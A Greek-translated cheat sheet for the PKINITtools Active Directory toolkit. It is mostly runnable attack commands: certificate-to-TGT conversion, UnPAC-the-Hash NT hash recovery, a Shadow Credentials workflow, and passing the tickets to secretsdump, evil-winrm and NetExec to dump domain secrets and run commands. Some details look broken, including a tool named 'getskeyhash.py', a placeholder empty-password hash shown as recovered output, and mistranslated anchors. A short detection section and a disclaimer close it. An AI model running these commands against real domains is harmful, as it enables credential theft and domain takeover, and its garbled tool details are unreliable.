<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎫 PKINITtools - Πλήρες φύλλο εξαπάτησης

[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
```
  ██████╗ ██╗  ██╗██╗███╗   ██╗██╗████████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔══██╗██║ ██╔╝██║████╗  ██║██║╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██████╔╝█████╔╝ ██║██╔██╗ ██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ███████╗
  ██╔═══╝ ██╔═██╗ ██║██║╚██╗██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ╚════██║
  ██║     ██║  ██╗██║██║ ╚████║██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
  ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
       Kerberos PKINIT Authentication, Shadow Credentials & UnPAC-the-Hash Toolkit
```
<p align="center">
  <img src="https://img.shields.io/badge/PKINITtools-Kerberos_PKINIT-blue?style=for-the-badge" alt="PKINITtools">
  <img src="https://img.shields.io/badge/Author-Dirk--jan_Mollema-orange?style=for-the-badge" alt="dirkjanm">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-MIT-red?style=for-the-badge" alt="Άδεια MIT">
</p>

<p align="center">
  <b>🌐 Εργαλεία για κρυπτογραφία δημόσιου κλειδιού Kerberos για αρχικό έλεγχο ταυτότητας (PKINIT), μετατροπή πιστοποιητικών σε εισιτήρια TGT και ανάκτηση κατακερματισμών NT</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Overview & The PKINIT Architecture](#-overview--the-pkinit-architecture)
- [Key Utilities: `gettgtpkinit.py` & `getskeyhash.py`](#-key-utilities-gettgtpkinitpy--getskeyhashpy)
- [Εγκατάσταση] (#-εγκατάσταση)
- [Μετατροπή πιστοποιητικών AD CS σε Kerberos TGT](#-converting-ad-cs-certificates-to-kerberos-tgt)
  - [Χρήση αρχείου PFX](#using-a-pfx-file)
  - [Χρήση Base64-Encoded PFX (Relay Chains)](#using-base64-encoded-pfx-relay-chains)
- [Ανάκτηση κατακερματισμών NT (UnPAC-the-Hash)](#-recovering-nt-hashes-unpac-the-hash)
- [Shadow Credentials Attack Workflow](#-shadow-credentials-attack-workflow)
- [Κατανάλωση του TGT με Impacket & NetExec](#-consuming-the-tgt-with-impacket--netexec)
- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
- [Defensive Considerations & Detection](#-defensive-considerations--detection)
- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)

---

## 🎯 Επισκόπηση & Αρχιτεκτονική PKINIT

Το **PKINIT** (Κρυπτογραφία δημόσιου κλειδιού για αρχικό έλεγχο ταυτότητας στο Kerberos, που ορίζεται στο **RFC 4556**) είναι μια επέκταση του πρωτοκόλλου Kerberos. Αντί να απαιτείται ο κατακερματισμός μυστικού κωδικού πρόσβασης (NTLM ή AES) ενός χρήστη για να ζητήσει ένα εισιτήριο χορήγησης εισιτηρίων Kerberos (TGT), το PKINIT επιτρέπει σε έναν πελάτη να αποδείξει την ταυτότητα χρησιμοποιώντας **ψηφιακά πιστοποιητικά X.509 και ζεύγη ιδιωτικών/δημόσιων κλειδιών**.

Δημιουργήθηκε από τον διάσημο ερευνητή του Active Directory **Dirk-jan Mollema (@_dirkjan)**, το **PKINITtools** παρέχει τα βασικά primitives της Python για:
1. Πραγματοποιήστε έλεγχο ταυτότητας σε ελεγκτές τομέα Active Directory μέσω PKINIT χρησιμοποιώντας εξαγόμενα ή αναμεταδομένα ψηφιακά πιστοποιητικά.
2. Αποκτήστε ένα τυπικό αρχείο Kerberos TGT (`.ccache`).
3. Ανακτήστε το καθαρό κείμενο **NTLM Hash** του λογαριασμού μέσω του μηχανισμού **UnPAC-the-Hash**.

---

## 🧰 Βασικά βοηθητικά προγράμματα: `gettgtpkinit.py` & `getskeyhash.py`

- **`gettgtpkinit.py`**: Επικοινωνεί με το KDC (Kerberos Key Distribution Center) μέσω της θύρας 88, παρουσιάζει το πιστοποιητικό και ζητά ένα θωρακισμένο TGT, αποθηκεύοντάς το ως αρχείο Kirbi ή ccache.
- **`getskeyhash.py`**: Ανακρίνει το Kerberos PAC (Πιστοποιητικό Χαρακτηριστικού Προνομίου) που επιστράφηκε στο δελτίο PKINIT για να υπολογίσει και να αποκαλύψει τον στατικό κατακερματισμό NT του λογαριασμού.

---

## 📥 Εγκατάσταση
```bash
# Clone GitHub repository
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools

# Install dependencies (requires impacket, cryptography, minikerberos)
pip3 install -r requirements.txt
pip3 install .
```
---

## 🎫 Μετατροπή πιστοποιητικών AD CS σε Kerberos TGT

Όταν αποκτάτε ένα πιστοποιητικό Active Directory μέσω Certipy, Coercer ή NTLM Relay:

### Χρήση αρχείου PFX
```bash
# Request TGT using a client certificate file (.pfx)
gettgtpkinit.py -cert-pfx administrator.pfx -pfx-pass 'CertPass123' corp.local/administrator admin.ccache
```
### Χρήση PFX με κωδικοποίηση Base64 (αλυσίδες ρελέ)

Συχνά, το `ntlmrelayx` εκτυπώνει πιστοποιητικά ως ακατέργαστη συμβολοσειρά base64 κατά τη διάρκεια επιθέσεων AD CS ESC8:
```bash
# Convert base64 certificate directly into a Kerberos TGT for Domain Controller (DC01$)
gettgtpkinit.py -pfx-base64 "MIIKggIBAzCCCXwGCSqGSIb3DQEHA..." corp.local/DC01\$ dc01.ccache
```
---

## 🔑 Ανάκτηση NT Hashes (UnPAC-the-Hash)

Όταν ένας λογαριασμός πραγματοποιεί έλεγχο ταυτότητας με το PKINIT, ο ελεγκτής τομέα υπογράφει το PAC με μια δομή PAC_CREDENTIAL_INFO που περιέχει το στατικό **NTLM hash** του λογαριασμού (κρυπτογραφημένο με ένα προσωρινό κλειδί AS-REP). Το `getskeyhash.py` αποκρυπτογραφεί αυτήν τη δομή:
```bash
# Extract the NTLM hash directly from the ticket and KDC
getskeyhash.py -hashes :7fc508... corp.local/administrator admin.ccache

# Output format:
# [*] Found PAC DATA
# [*] Decrypted PAC_CREDENTIAL_INFO
# [!] Recovered NT Hash: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```
Με το NT hash στο χέρι, μπορείτε να εκτελέσετε αμέσως **Pass-the-Hash** ή σπάσιμο εκτός σύνδεσης!

---

## 👥 Ροή εργασιών επίθεσης Shadow Credentials

Όταν έχετε πρόσβαση εγγραφής σε ένα αντικείμενο Active Directory (`GenericAll`, `GenericWrite`, `WriteProperty` σε `msDS-KeyCredentialLink`):
```bash
# 1. Use pyWhisker to inject a newly generated key credential into the victim object
pywhisker.py -d "corp.local" -u "lowuser" -p "Password123" --target "TargetUser" --action "add" --export "targetuser.pfx"

# 2. Use PKINITtools to authenticate with the forged certificate
gettgtpkinit.py -cert-pfx targetuser.pfx -pfx-pass "pywhisker" corp.local/TargetUser target.ccache

# 3. Extract TargetUser's NT Hash
getskeyhash.py corp.local/TargetUser target.ccache
```
---

## 🚀 Καταναλώνοντας το TGT με Impacket & NetExec

Μόλις το `gettgtpkinit.py` εμφανίσει ένα εισιτήριο `.ccache`, εξάγετε το στο περιβάλλον:
```bash
# Set Kerberos credential cache environment variable
export KRB5CCNAME=/path/to/admin.ccache

# Dump domain secrets via Impacket without passwords!
impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local

# Connect via Evil-WinRM using Kerberos ticket
evil-winrm -i dc01.corp.local -r corp.local

# Execute commands using NetExec with Kerberos auth
nxc smb dc01.corp.local -k --no-pass -x "whoami /priv"
```
---

## ⚡ Γρήγορος Πίνακας Αναφοράς

| Στόχος | Εντολή |
|-----------|---------|
| **TGT μέσω αρχείου PFX** | `gettgtpkinit.py -cert-pfx <FILE.pfx> <DOMAIN>/<USER> <OUT.ccache>` |
| **TGT μέσω Base64 Cert** | `gettgtpkinit.py -pfx-base64 "<BASE64>" <DOMAIN>/<USER> <OUT.ccache>` |
| **Καθορίστε τον ελεγκτή τομέα**| `gettgtpkinit.py -dc-ip <DC_IP> -cert-pfx <CERT> <DOMAIN>/<USER> <TGT>` |
| **UnPAC-the-Hash (Λήψη NTLM)**| `getskeyhash.py <DOMAIN>/<USER> <TGT.ccache>` |
| **Περάστε το TGT στο Impacket** | `export KRB5CCNAME=<TGT.ccache>; impacket-secretsdump -k -no-pass <DOMAIN>/<USER>@<DC>` |
| **Περάστε το TGT στο NetExec** | `export KRB5CCNAME=<TGT.ccache>; nxc smb <DC> -k --no-pass` |

---

## 🛡️ Αμυντικές Θεωρήσεις & Ανίχνευση

1. **Αναγνωριστικό συμβάντος 4768 (Αίτημα TGT):** Η υπηρεσία καταλόγου Active Directory καταγράφει αιτήματα Kerberos TGT. Όταν χρησιμοποιείται το PKINIT, το πεδίο **Τύπος Προ-Επαλήθευσης** εμφανίζει `16` (PKINIT) αντί για `2` (PA-ENC-TIMESTAMP).
2. **Έλεγχος Τροποποιήσεων `msDS-KeyCredentialLink`:** Το Αναγνωριστικό συμβάντος 5136 καταγράφει τις τροποποιήσεις αντικειμένων καταλόγου. Ειδοποίηση όταν τα βασικά διαπιστευτήρια προστίθενται σε λογαριασμούς που δεν διαχειρίζονται Azure/Intune.

---

## ⚠️ Νομική αποποίηση ευθύνης

> [!ΠΡΟΣΟΧΗ]
> Το PKINITtools προορίζεται μόνο για εξουσιοδοτημένο έλεγχο ασφαλείας Active Directory, λειτουργίες Red Team και εκπαιδευτική έρευνα. Η χειραγώγηση εταιρικών εισιτηρίων Kerberos χωρίς ρητή άδεια είναι παράνομη.